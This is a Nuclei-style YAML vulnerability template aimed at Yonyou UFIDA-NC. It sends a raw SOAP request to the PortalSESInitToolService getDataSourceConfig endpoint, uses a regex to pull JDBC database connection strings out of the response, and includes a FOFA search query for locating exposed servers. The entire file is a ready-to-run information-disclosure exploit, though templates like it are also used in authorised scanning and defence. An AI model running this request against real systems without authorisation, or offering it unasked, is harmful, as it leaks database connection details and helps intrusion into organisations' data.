0.local/pocs/oa/yonyou/poc-local-oa-yonyou-nc-uapws-PortalSESInitToolService-database-read.yaml

id: poc-local-oa-yonyou-nc-uapws-PortalSESInitToolService-database-read

info:
  name: poc-local-oa-yonyou-nc-uapws-PortalSESInitToolService-database-read
  author: capiton
  severity: medium
  description: "用友NC UFIDA-NC JDBC数据库连接信息泄露"
  reference:
    - ""
  metadata:
    fofa-query: app="用友-UFIDA-NC"
    Vulnerability-Impact: 用友NC UFIDA-NC
  tags: yonyou,oa

requests:
  - raw:
      - |
        POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService">
         <soapenv:Header/>
         <soapenv:Body>
            <por:getDataSourceConfig/>
         </soapenv:Body>
        </soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "jdbc"
        part: body
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '(jdbc:.+\:\d{1,5}\:\w+)'
